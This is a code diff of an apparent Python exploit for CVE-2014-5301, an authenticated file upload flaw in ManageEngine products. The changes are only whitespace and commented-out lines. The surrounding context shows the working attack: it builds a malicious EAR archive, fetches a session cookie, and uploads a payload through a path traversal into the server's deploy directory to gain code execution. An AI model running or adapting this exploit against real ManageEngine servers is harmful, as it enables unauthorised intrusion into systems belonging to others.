@@ -7,9 +7,7 @@ from requests_toolbelt import MultipartEncoder
 import string
 import random
 
-
 def banner():
-
     print("""# ManageEngine Multiple Products Authenticated File Upload
 #
 # [CVE', '2014-5301'],
@@ -56,7 +54,6 @@ def make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_nam
     app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
 	
     ear.writestr('META-INF/application.xml', app_xml)
-
     ear.close()
 	
 def get_cookie(target_uri):
@@ -92,7 +89,6 @@ def upload_request(cookie, target_uri, payload_name, payload_str):
 
     # must change every try you make or upload will fail!!!!
     att_desc = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(20))
-
 
     if '.ear' in payload_name:
         upload_path = '../../server/default/deploy'
@@ -148,8 +144,6 @@ def main():
             sys.exit(0)
 		
         #bogus upload 
-        #payload_name = ear_app_base
-        #payload_str = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(9))
         cookie, text, status = upload_request(cookie, target_uri, rts5, rts6)
 
         #payload uploas
